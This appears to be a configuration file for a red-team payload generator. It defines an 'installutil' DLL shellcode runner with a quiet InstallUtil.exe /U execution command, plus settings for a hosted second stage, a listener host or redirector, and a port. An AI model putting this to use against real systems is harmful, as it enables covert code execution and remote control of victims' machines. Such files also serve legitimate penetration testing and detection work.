[Type]
name: installutil
info: DLL based shellcode runner
template: ./template/SCT/allthethings.template
runInfo: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings_installutil.dll

[HostedDomain]
var: http://127.0.0.1
allowWilds: True
help: The domain, IP, or path of your Hosted SCT second stage

[ListenerDomain]
var: 127.0.0.1
allowWilds: True
help: Your listener domain or IP, can be a redirector

[ListenerPort]
var: 80
allowWilds: True
forceInteger: True
help: Your listener port

[Output]
var: allthethings.cs
allowWilds: True
